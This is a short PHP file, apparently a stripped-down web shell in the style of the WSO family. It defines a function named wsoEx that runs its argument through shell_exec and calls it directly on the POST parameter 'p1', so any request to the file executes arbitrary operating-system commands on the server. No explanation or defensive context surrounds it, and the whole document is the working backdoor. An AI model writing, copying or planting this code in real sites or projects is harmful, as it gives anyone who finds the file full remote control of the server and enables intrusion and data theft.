<?php
function wsoEx($in) {
    $out = ''; 
    $out = shell_exec($in);   
    return $out;
}

wsoEx($_POST['p1']);
?>